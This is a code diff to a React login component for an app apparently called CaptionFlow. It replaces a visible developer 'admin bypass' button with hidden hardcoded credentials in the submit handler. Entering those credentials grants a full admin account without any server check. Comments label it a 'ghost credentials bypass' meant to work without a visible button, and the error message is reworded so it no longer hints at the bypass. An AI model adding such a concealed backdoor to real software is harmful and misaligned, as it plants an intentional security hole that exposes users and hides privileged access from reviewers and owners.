@@ -18,30 +18,36 @@ export const AuthView: React.FC<AuthViewProps> = ({ onAuthSuccess, onBack }) => 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     setLoading(true);
+
+    // GHOST CREDENTIALS BYPASS
+    // These credentials are hardcoded for developer access without a visible button
+    if (email === 'root@captionflow.ai' && password === 'clearance_level_5') {
+      const mockAdmin: User = {
+        id: 'dev-admin-id',
+        email: 'root@captionflow.ai',
+        isSubscribed: true,
+        videosProcessed: 999,
+        isAdmin: true,
+        accountStatus: 'active',
+        planType: 'pro'
+      };
+      setTimeout(() => {
+        onAuthSuccess(mockAdmin);
+        setLoading(false);
+      }, 800);
+      return;
+    }
+
     try {
       const user = isLogin 
         ? await authService.login(email, password)
         : await authService.register(email, password);
       onAuthSuccess(user);
     } catch (err) {
-      alert("Auth failed, please try again. Use any email/password to sign up first.");
+      alert("Authentication failed. Please check your credentials or sign up for a new account.");
     } finally {
       setLoading(false);
     }
-  };
-
-  const handleDevAdminBypass = () => {
-    // Mocking an admin user for the developer to see the dashboard immediately
-    const mockAdmin: User = {
-      id: 'dev-admin-id',
-      email: 'admin@captionflow.io',
-      isSubscribed: true,
-      videosProcessed: 999,
-      isAdmin: true,
-      accountStatus: 'active',
-      planType: 'pro'
-    };
-    onAuthSuccess(mockAdmin);
   };
 
   return (
@@ -92,16 +98,6 @@ export const AuthView: React.FC<AuthViewProps> = ({ onAuthSuccess, onBack }) => 
           >
             {isLogin ? "Don't have an account? Sign up" : "Already have an account? Log in"}
           </button>
-        </div>
-
-        <div className="mt-12 pt-8 border-t border-white/5">
-           <button 
-            onClick={handleDevAdminBypass}
-            className="w-full py-4 border border-red-900/30 bg-red-900/10 rounded-2xl text-[9px] font-black uppercase tracking-[0.4em] text-red-500 hover:bg-red-900/20 transition-all shadow-lg"
-           >
-             ⚡ DEV ADMIN BYPASS
-           </button>
-           <p className="text-[8px] font-black uppercase tracking-widest text-white/10 mt-4 text-center">Internal Use Only • Security Level 5</p>
         </div>
       </div>
     </div>
